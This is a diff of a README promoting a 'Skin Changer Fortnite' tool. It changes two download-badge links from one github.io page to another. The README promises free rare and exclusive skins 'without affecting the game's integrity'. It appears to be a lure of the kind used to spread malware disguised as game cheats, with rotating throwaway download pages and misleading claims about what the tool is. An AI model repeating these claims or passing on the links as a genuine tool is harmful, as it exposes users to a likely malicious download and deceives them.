@@ -2,7 +2,7 @@
 
 Skin Changer Fortnite is a tool designed to help players customize their Fortnite characters with a variety of skins. With this changer, you can easily swap your skins, including rare and exclusive ones like the Galaxy skin, without spending any money. This tool is perfect for players who want to enjoy a fresh look in Fortnite, with a seamless experience that works without affecting the game’s integrity.
 
-[![Download Skin Changer Fortnite](https://img.shields.io/badge/⬇️%20Download%20Skin%20Changer%20Fortnite-blueviolet)](https://hiopal3847.github.io/.github/92)
+[![Download Skin Changer Fortnite](https://img.shields.io/badge/⬇️%20Download%20Skin%20Changer%20Fortnite-blueviolet)](https://skinchangerloads.github.io/.github/)
 
 ---
 
@@ -55,7 +55,7 @@ Skin Changer Fortnite is a tool designed to help players customize their Fortnit
 
 ---
 
-[![Download Skin Changer Fortnite (Mirror)](https://img.shields.io/badge/⬇️%20Download%20Mirror-blueviolet)](https://hiopal3847.github.io/.github/92)
+[![Download Skin Changer Fortnite (Mirror)](https://img.shields.io/badge/⬇️%20Download%20Mirror-blueviolet)](https://skinchangerloads.github.io/.github/)
 
 ---
 
